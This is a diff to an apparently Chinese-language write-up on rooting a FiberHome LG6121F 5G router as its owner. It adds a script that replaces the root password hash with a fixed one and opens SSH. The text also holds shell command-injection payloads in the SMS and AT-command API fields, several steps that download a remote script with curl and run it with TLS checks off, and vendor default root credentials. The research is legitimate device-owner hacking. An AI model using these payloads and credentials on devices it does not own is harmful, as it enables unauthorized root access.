@@ -103,7 +103,65 @@ resp = decrypt(POST('/api/tmp/FHAPIS', encrypt(json.dumps({
 
 ## 获取 Shell 访问
 
-研究过程中找到了好几种获取 Shell 的方法，按操作便捷程度排序。
+### 开启 SSH 所需步骤
+
+在介绍各种拿 shell 的方法之前，需要知道直接运行 `dropbear -p 22` 是不行的，有两个障碍：
+
+1. **Host key 无法生成**：根文件系统是只读的 squashfs，dropbear 默认的 key 目录 `/etc/dropbear/` 不可写，需要手动生成 key 到 `/tmp`
+2. **默认密码无法登录**：`/etc/shadow` 中 root 密码的 hash 是 SHA-512（`$6$`），但设备的 musl libc `crypt()` 只支持 DES 和 MD5（`$1$`），导致 SSH 登录时密码校验永远失败。需要生成一个 MD5 hash 的 shadow 文件并 bind mount 覆盖
+
+我把这些步骤整理成了一个脚本，可以一键进行这些操作：
+
+```shell
+#!/bin/sh
+# FiberHome LG6121F - 一键开启 SSH
+
+# 覆盖 /etc/shadow，密码设为 root123
+ROOT_PASS='root123'
+ROOT_HASH=$(OPENSSL_CONF=/dev/null openssl passwd -1 -salt '' "$ROOT_PASS")
+[ ! -f /data/shadow_orig ] && cp /etc/shadow /data/shadow_orig
+umount /etc/shadow 2>/dev/null
+echo "root:${ROOT_HASH}:18673:0:99999:7:::
+daemon:*:0:0:99999:7:::
+ftp:*:0:0:99999:7:::
+network:*:0:0:99999:7:::
+nobody:*:0:0:99999:7:::
+dnsmasq:*:0:0:99999:7:::
+sshd:*:0:0:99999:7:::" > /tmp/shadow_new
+mount --bind /tmp/shadow_new /etc/shadow
+
+# 启动 dropbear SSH（优先使用 /data 持久 key）
+pidof dropbear > /dev/null || {
+    KEY=/tmp/dropbear_key
+    [ -f /data/dropbear_rsa_key ] && KEY=/data/dropbear_rsa_key
+    [ ! -f "$KEY" ] && dropbearkey -t rsa -f "$KEY" 2>/dev/null
+    dropbear -p 22 -r "$KEY"
+}
+
+# 放行防火墙
+iptables -C INPUT -p tcp --dport 22 -j ACCEPT 2>/dev/null || \
+    iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT
+```
+
+你也可以自己写一个类似的脚本上传到 CPE 可以访问的地方，后面各种方法拿到 shell 后都可以执行这个脚本来开启 SSH 服务：
+
+```shell
+# 下载脚本到持久分区
+curl -sSLk -o /data/ssh_enable.sh assets.codm.ing/scripts/ssh_enable.sh
+
+# 执行
+sh /data/ssh_enable.sh
+```
+
+完成后即可登录：
+
+```shell
+ssh root@192.168.8.1
+# 密码: root123
+```
+注意，这些都是临时的，重启后 `/tmp` 清空，bind mount 失效，dropbear 和防火墙规则都会丢失。持久化方案见后面的「解锁与固件修改」章节。但脚本本身保存在 `/data/`，重启后再执行一次 `sh /data/ssh_enable.sh` 就能恢复。
+
+下面介绍几种在设备上执行命令的方式，按操作便捷程度排序。
 
 ### 短信功能注入
 
@@ -124,47 +182,43 @@ mn_send_pdu '%s'    '%s'    "%s"
 新建短信，收件人填一个正常号码，比如 `10000`，也可以写你自己的其他手机号，这样可以通过收到的短信内容查看是否有报错信息，短信内容填：
 
 ```
-test`dropbear -p 22`
+test`id > /tmp/inject_test`
 ```
 
 点击发送后，后端生成的 shell 命令是：
 
 ```shell
-mn_send_pdu '10000' 'GSM_8BIT' "test`dropbear -p 22`"
+mn_send_pdu '10000' 'GSM_8BIT' "test`id > /tmp/inject_test`"
 ```
 
-Shell 在解析双引号字符串时，会先对反引号 `` ` `` 包裹的内容进行命令替换（Command Substitution），即先执行 `dropbear -p 22`，再把输出（这个命令无输出）拼回原字符串，然后才执行 `mn_send_pdu` 发送短信。也就是说 SSH 服务先启动，短信后发出。
+Shell 在解析双引号字符串时，会先对反引号 `` ` `` 包裹的内容进行命令替换（Command Substitution），即先执行 `id > /tmp/inject_test`，再把输出拼回原字符串，然后才执行 `mn_send_pdu` 发送短信。
 
-接着再发一条短信放行防火墙：
+确认注入可用后，通过发送下面的两条短信来开启 SSH：
 
 ```
-test`iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT`
+test`curl -sSLk -o /data/ssh_enable.sh assets.codm.ing/scripts/ssh_enable.sh`
+
+test`sh /data/ssh_enable.sh`
 ```
 
-现在就可以 SSH 登录了，设备 `/etc/shadow` 中 root 的默认密码是 `F1ber@dm!n`：
-
-```shell
-ssh root@192.168.8.1
-# 密码: F1ber@dm!n
-```
+短信注入没有回显，发送后直接尝试 `ssh root@192.168.8.1`（密码 root123），如果连不上则检查命令是否正确，或者是否成功下载了脚本。
 
 如果通过 API 直接调用，注入方式更灵活，`content` 字段可以用双引号闭合：
 
 ```javascript
-// API 调用示例（需先登录获取 session）
 $post("send_msg", {
     recv_number: "10000",
     encode_schema: "GSM_8BIT",
-    content: 'hello";dropbear -p 22;echo "'
+    content: 'hello";sh /data/ssh_enable.sh;echo "'
 })
-// 生成: mn_send_pdu '10000' 'GSM_8BIT' "hello";dropbear -p 22;echo ""
+// 生成: mn_send_pdu '10000' 'GSM_8BIT' "hello";sh /data/ssh_enable.sh;echo ""
 ```
 
 `recv_number` 字段同样可以注入（单引号闭合）：
 
 ```javascript
 $post("send_msg", {
-    recv_number: "';dropbear -p 22;echo '",
+    recv_number: "';sh /data/ssh_enable.sh;echo '",
     encode_schema: "GSM_8BIT",
     content: "test"
 })
@@ -198,14 +252,14 @@ POST /api/tmp/FHAPIS  ajaxmethod=set_at_command
 # → {"at_result": "uid=0(root) gid=0(root)\n"}
 ```
 
-用这个方法启动 SSH，分两步：
+用这个方法开启 SSH：
 
 ```shell
 POST /api/tmp/FHAPIS  ajaxmethod=set_at_command
-{'command': 'AT|dropbear -p 22'}
+{'command': 'AT|curl -sSLk -o /data/ssh_enable.sh assets.codm.ing/scripts/ssh_enable.sh'}
 
 POST /api/tmp/FHAPIS  ajaxmethod=set_at_command
-{'command': 'AT|iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT'}
+{'command': 'AT|sh /data/ssh_enable.sh'}
 ```
 
 ### ADB 方式
@@ -218,8 +272,10 @@ POST /api/tmp/FHAPIS  ajaxmethod=set_at_command
 adb devices
 # 应该能看到设备列表中出现一条记录
 
-# 开启 SSH
-adb shell "dropbear -p 22; iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT"
+# 下载并执行脚本开启 SSH
+adb shell "curl -sSLk -o /data/ssh_enable.sh assets.codm.ing/scripts/ssh_enable.sh"
+
+adb shell "sh /data/ssh_enable.sh"
 ```
 
 ### Telnet：间接方式
@@ -238,8 +294,15 @@ telnet 192.168.8.1
 su root
 # 默认密码: f1ber@dm!n + MAC 后6位，例如 f1ber@dm!nD4E5F6
 
-dropbear -p 22
-iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT
+# 下载并执行脚本开启 SSH
+curl -sSLk -o /data/ssh_enable.sh assets.codm.ing/scripts/ssh_enable.sh
+sh /data/ssh_enable.sh
+
+# 退出 Telnet，SSH 登录
+exit
+
+ssh root@192.168.8.1
+# 密码: root123
 ```
 
 ### 不知道管理员密码时
@@ -314,7 +377,7 @@ POST /api/tmp/FHNCAPIS  ajaxmethod=set_value_by_xmlnode
 | Web superadmin | `F1ber$dm​` | RP0107+ 版本 |
 | Telnet admin | `hg2x0` + MAC 后 6 位 | 例如 `hg2x0D4E5F6` |
 | su root | `f1ber@dm!n` + MAC 后 6 位 | MD5 crypt 验证 |
-| /etc/shadow root | `F1ber@dm!n` | SHA-512，固件内固定 |
+| /etc/shadow root | `F1ber@dm!n` | SHA-512 hash，musl 不支持，**SSH 无法使用** |
 | FTP | `admin` / `f1ber@dm!n` | 工厂模式可用 |
 
 ### A/B 双分区机制
@@ -579,28 +642,36 @@ reboot
 
 ### 服务自启动
 
-Overlay 激活后 `/etc` 变成可写的了，现在可以配置 SSH 自启动了。首次启动修改后的固件后执行一次：
+Overlay 激活后 `/etc` 变成可写的了，现在可以配置 SSH 自启动了。首次启动修改后的固件时，SSH 还没有自启动，需要先用前面的方法临时开启，脚本已经在 `/data/ssh_enable.sh`（重启不丢失），随便用哪种方式执行一次就行：
 
 ```shell
-# 1. 重启后 overlay 已激活，但 SSH 还没自启动，需要使用前面的方法临时开启 SSH，再登录设备：
-ssh root@192.168.8.1   # 密码: F1ber@dm!n
+# 例如通过 AT 注入
+POST /api/tmp/FHAPIS  ajaxmethod=set_at_command
+{'command': 'AT|sh /data/ssh_enable.sh'}
 
-# 2. 修改 root 密码
+# 或者通过 ADB
+adb shell "sh /data/ssh_enable.sh"
+```
+
+SSH 登录后（密码 root123），配置永久自启动：
+
+```shell
+# 1. 设置永久 root 密码（overlay 下 /etc/shadow 可写了）
+umount /etc/shadow 2>/dev/null   # 先解除 ssh_enable.sh 的 bind mount
 passwd root
 
-# 3. 启用 dropbear 自启动（overlay 下 /etc 可写，持久生效）
+# 2. 启用 dropbear 自启动
 /etc/init.d/dropbear enable
 
-# 4. 配置防火墙持久化
+# 3. 配置防火墙持久化
 cat > /etc/rc.local << 'EOF'
 iptables -C INPUT -p tcp --dport 22 -j ACCEPT 2>/dev/null || \
     iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT
 exit 0
 EOF
-
-# 5. 检查 /etc/rc.local 内容
-cat /etc/rc.local
 ```
+
+重启验证：SSH 应自动可用，无需再执行脚本。
 
 还有一个小坑：原始的 `S99zmtk_boot_done` 脚本在更新 bootctrl 时没有先解锁 MTD，导致写入静默失败。需要在 overlay 里打个补丁，在 `set_bootctrl_string` 前后加上 `/data/mtd_unlock 3` 和 `/data/mtd_unlock 3 lock`。
 
